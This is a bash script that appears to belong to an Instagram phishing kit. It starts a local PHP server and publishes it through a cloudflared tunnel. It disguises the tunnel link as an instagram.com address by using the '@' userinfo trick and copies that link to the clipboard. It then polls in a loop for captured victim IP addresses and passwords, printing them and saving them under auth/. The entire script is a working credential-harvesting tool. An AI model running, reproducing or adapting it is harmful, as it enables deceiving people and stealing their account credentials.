HOST="127.0.0.1"
PORT="8008"



killall php
killall cloudflared


echo "PHP server has started at ${HOST}:${PORT}"
php -S ${HOST}:${PORT} > /dev/null 2>&1 & 


custom_url() {            
        url=${1#http*//}
        echo url is : https://instagram.com@$url
        echo https://instagram.com@$url | pbcopy
}


rm -rf auth/log
touch log
cloudflared tunnel -url "$HOST":"$PORT" --logfile auth/log > /dev/null 2>&1 & 
sleep 16
echo "cloudflared tunnel has started at ${HOST}:${PORT}"
cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "auth/log")

echo url is : $cldflr_url
custom_url "$cldflr_url"



while true; do
if [[ -e "ip.txt" ]]; then
cat ip.txt; 
cat ip.txt >> auth/ip.txt;
rm -rf ip.txt;
fi
sleep 0.75
if [[ -e "passwd.txt" ]]; then
cat passwd.txt;
cat passwd.txt >> auth/passwd.txt;
rm -rf passwd.txt;
fi
sleep 0.75
done